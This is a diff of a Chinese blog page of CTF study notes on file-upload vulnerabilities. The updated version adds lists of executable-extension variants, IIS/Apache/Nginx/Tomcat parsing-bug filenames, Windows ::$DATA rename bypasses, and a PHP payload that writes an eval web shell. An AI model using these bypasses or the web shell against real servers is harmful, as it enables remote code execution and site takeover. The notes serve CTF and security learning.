@@ -142,18 +142,18 @@
   };
 </script>
 
-  <meta name="description" content="前言 本篇文章专门用于记录做文件上传类题目的做题姿势，会不断更新。  $_FILES属性 $_FILES[“file”][“name”] - 被上传文件的名称 $_FILES[“file”][“type”] - 被上传文件的类型 $_FILES[“file”][“size”] - 被上传文件的大小，以字节计 $_FILES[“file”][“tmp_name”] - 存储在服务器的文件的临时副本的">
+  <meta name="description" content="前言 本篇文章专门用于记录做文件上传类题目的做题姿势，会不断更新。  文件上传可解析后缀asp/aspx 1asp,aspx,asa,asax,ascx,ashx,asmx,cer,aSp,aSpx,aSa,aSax,aScx,aShx,aSmx,cEr  php 1php,php5,php4,php3,php2,pHp,pHp5,pHp4,pHp3,pHp2,html,htm,phtml,pht">
 <meta name="keywords" content="CTF,总结">
 <meta property="og:type" content="article">
 <meta property="og:title" content="CTF-Web【文件上传】漏洞做题姿势积累">
 <meta property="og:url" content="https://fanygit.github.io/2021/10/22/CTF-Web【文件上传】漏洞做题姿势积累/index.html">
 <meta property="og:site_name" content="Fan的小酒馆">
-<meta property="og:description" content="前言 本篇文章专门用于记录做文件上传类题目的做题姿势，会不断更新。  $_FILES属性 $_FILES[“file”][“name”] - 被上传文件的名称 $_FILES[“file”][“type”] - 被上传文件的类型 $_FILES[“file”][“size”] - 被上传文件的大小，以字节计 $_FILES[“file”][“tmp_name”] - 存储在服务器的文件的临时副本的">
+<meta property="og:description" content="前言 本篇文章专门用于记录做文件上传类题目的做题姿势，会不断更新。  文件上传可解析后缀asp/aspx 1asp,aspx,asa,asax,ascx,ashx,asmx,cer,aSp,aSpx,aSa,aSax,aScx,aShx,aSmx,cEr  php 1php,php5,php4,php3,php2,pHp,pHp5,pHp4,pHp3,pHp2,html,htm,phtml,pht">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2021-12-13T14:37:46.666Z">
+<meta property="og:updated_time" content="2022-08-27T11:00:36.435Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="CTF-Web【文件上传】漏洞做题姿势积累">
-<meta name="twitter:description" content="前言 本篇文章专门用于记录做文件上传类题目的做题姿势，会不断更新。  $_FILES属性 $_FILES[“file”][“name”] - 被上传文件的名称 $_FILES[“file”][“type”] - 被上传文件的类型 $_FILES[“file”][“size”] - 被上传文件的大小，以字节计 $_FILES[“file”][“tmp_name”] - 存储在服务器的文件的临时副本的">
+<meta name="twitter:description" content="前言 本篇文章专门用于记录做文件上传类题目的做题姿势，会不断更新。  文件上传可解析后缀asp/aspx 1asp,aspx,asa,asax,ascx,ashx,asmx,cer,aSp,aSpx,aSa,aSax,aScx,aShx,aSmx,cEr  php 1php,php5,php4,php3,php2,pHp,pHp5,pHp4,pHp3,pHp2,html,htm,phtml,pht">
 
 
 
@@ -479,7 +479,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2021-12-13 22:37:46" itemprop="dateModified" datetime="2021-12-13T22:37:46+08:00">2021-12-13</time>
+                <time title="修改时间：2022-08-27 19:00:36" itemprop="dateModified" datetime="2022-08-27T19:00:36+08:00">2022-08-27</time>
               </span>
             
           
@@ -564,21 +564,44 @@
         <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote>
 <p>本篇文章专门用于记录做文件上传类题目的做题姿势，会不断更新。</p>
 </blockquote>
-<h2 id="FILES属性"><a href="#FILES属性" class="headerlink" title="$_FILES属性"></a>$_FILES属性</h2><ul>
-<li>$_FILES[“file”][“name”] - 被上传文件的名称</li>
-<li>$_FILES[“file”][“type”] - 被上传文件的类型</li>
-<li>$_FILES[“file”][“size”] - 被上传文件的大小，以字节计</li>
-<li>$_FILES[“file”][“tmp_name”] - 存储在服务器的文件的临时副本的名称</li>
-<li>$_FILES[“file”][“error”] - 由文件上传导致的错误代码</li>
-</ul>
-<h2 id="绕过-xif-imagetype-方式"><a href="#绕过-xif-imagetype-方式" class="headerlink" title="绕过 xif_imagetype()方式"></a>绕过 xif_imagetype()方式</h2><p>添加gif文件头</p>
+<h3 id="文件上传可解析后缀"><a href="#文件上传可解析后缀" class="headerlink" title="文件上传可解析后缀"></a>文件上传可解析后缀</h3><p><strong>asp/aspx</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asp,aspx,asa,asax,ascx,ashx,asmx,cer,aSp,aSpx,aSa,aSax,aScx,aShx,aSmx,cEr</span><br></pre></td></tr></table></figure>
+
+<p><strong>php</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php,php5,php4,php3,php2,pHp,pHp5,pHp4,pHp3,pHp2,html,htm,phtml,pht,Html,Htm,pHtml</span><br></pre></td></tr></table></figure>
+
+<p><strong>jsp</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jsp,jspa,jspx,jsw,jsv,jspf,jtml,jSp,jSpx,jSpa,jSw,jSv,jSpf,jHtml</span><br></pre></td></tr></table></figure>
+
+<h3 id="中间件解析漏洞"><a href="#中间件解析漏洞" class="headerlink" title="中间件解析漏洞"></a>中间件解析漏洞</h3><p>iis</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.IIS6.0文件解析</span><br><span class="line">xx.asp;.jpg（服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了）</span><br><span class="line">2.IIS6.0目录解析</span><br><span class="line">xx.asp/1.jpg (服务器默认会把.asp，.asa目录下的文件都解析成asp文件。)</span><br><span class="line">3.IIS 7.0畸形解析 </span><br><span class="line">xxx.jpg/x.asp</span><br></pre></td></tr></table></figure>
+
+<p>apache</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.%0a(CVE-2017-15715)（apache 2.4.0 - 2.4.29）</span><br><span class="line"></span><br><span class="line">更多姿势</span><br><span class="line">https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html</span><br><span class="line"></span><br><span class="line">2.未知后缀 test.php.xxx（Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断）</span><br></pre></td></tr></table></figure>
+
+<p>nginx</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">访问连接加/xxx.php test.jpg/.php (跟版本没有关系 属于配置不当)</span><br><span class="line"></span><br><span class="line">畸形解析漏洞 test.jpg%00.php</span><br><span class="line"></span><br><span class="line">CVE-2013-4547（Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7）</span><br><span class="line">test.jpg(非编码空格)\0x.php </span><br><span class="line"></span><br><span class="line">www.xxxx.com/UploadFiles/image/1.jpg/1.php</span><br><span class="line">www.xxxx.com/UploadFiles/image/1.jpg%00.php</span><br><span class="line">www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php</span><br><span class="line"></span><br><span class="line">另外一种手法：上传一个名字为test.jpg，以下内容的文件。</span><br><span class="line"></span><br><span class="line">&lt;?PHPfputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?phpeval($_POST[cmd])?&gt;&apos;);?&gt;</span><br><span class="line">然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php。</span><br></pre></td></tr></table></figure>
+
+<p>tomcat（仅限windows）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xxx.jsp/</span><br><span class="line"></span><br><span class="line">xxx.jsp%20</span><br><span class="line"></span><br><span class="line">xxx.jsp::$DATA</span><br></pre></td></tr></table></figure>
+
+<h3 id="绕过-xif-imagetype-方式"><a href="#绕过-xif-imagetype-方式" class="headerlink" title="绕过 xif_imagetype()方式"></a>绕过 xif_imagetype()方式</h3><p>添加gif文件头</p>
 <p>GIF89a</p>
-<h2 id="00截断上传漏洞"><a href="#00截断上传漏洞" class="headerlink" title="%00截断上传漏洞"></a>%00截断上传漏洞</h2><p>php版本&lt;5.34</p>
-<h2 id="windows系统解析漏洞绕过"><a href="#windows系统解析漏洞绕过" class="headerlink" title="windows系统解析漏洞绕过"></a>windows系统解析漏洞绕过</h2><p>1、上传1.php(或者图片马)，抓包改为1.php.</p>
+<h3 id="截断上传漏洞"><a href="#截断上传漏洞" class="headerlink" title="截断上传漏洞"></a>截断上传漏洞</h3><p>%00截断上传</p>
+<p>php版本&lt;5.3.4</p>
+<h3 id="windows系统解析漏洞绕过"><a href="#windows系统解析漏洞绕过" class="headerlink" title="windows系统解析漏洞绕过"></a>windows系统解析漏洞绕过</h3><p>1、上传1.php(或者图片马)，抓包改为1.php.</p>
 <p>2、上传1.php(或者图片马)，抓包改为1.php::$DATA</p>
 <p>3、上传1.php(或者图片马)，抓包改为1.php:1.jpg</p>
 <p>4、上传1.php(或者图片马)，抓包改为1.php::$DATA…….</p>
-<h2 id="利用-user-ini文件进行上传-前提是当前上传的目录存在php文件"><a href="#利用-user-ini文件进行上传-前提是当前上传的目录存在php文件" class="headerlink" title="利用.user.ini文件进行上传  前提是当前上传的目录存在php文件"></a><strong>利用.user.ini文件进行上传  前提是当前上传的目录存在php文件</strong></h2>
+<h3 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h3><blockquote>
+<p>利用.user.ini文件进行上传前提是当前上传的目录存在php文件</p>
+</blockquote>
+<blockquote>
+<p>上传.htaccess  (Apache)</p>
+</blockquote>
+<p>更多</p>
+<p><a href="https://websec.readthedocs.io/zh/latest/vuln/fileupload.html" target="_blank" rel="noopener">https://websec.readthedocs.io/zh/latest/vuln/fileupload.html</a></p>
+
       
     </div>
 
@@ -1025,7 +1048,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#FILES属性"><span class="nav-number"></span> <span class="nav-text">$_FILES属性</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过-xif-imagetype-方式"><span class="nav-number"></span> <span class="nav-text">绕过 xif_imagetype()方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#00截断上传漏洞"><span class="nav-number"></span> <span class="nav-text">%00截断上传漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#windows系统解析漏洞绕过"><span class="nav-number"></span> <span class="nav-text">windows系统解析漏洞绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用-user-ini文件进行上传-前提是当前上传的目录存在php文件"><span class="nav-number"></span> <span class="nav-text">利用.user.ini文件进行上传  前提是当前上传的目录存在php文件</span></a></li></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件上传可解析后缀"><span class="nav-number">2.</span> <span class="nav-text">文件上传可解析后缀</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#中间件解析漏洞"><span class="nav-number">3.</span> <span class="nav-text">中间件解析漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过-xif-imagetype-方式"><span class="nav-number">4.</span> <span class="nav-text">绕过 xif_imagetype()方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#截断上传漏洞"><span class="nav-number">5.</span> <span class="nav-text">截断上传漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#windows系统解析漏洞绕过"><span class="nav-number">6.</span> <span class="nav-text">windows系统解析漏洞绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#小技巧"><span class="nav-number">7.</span> <span class="nav-text">小技巧</span></a></li></ol></div>
             
 
           </div>
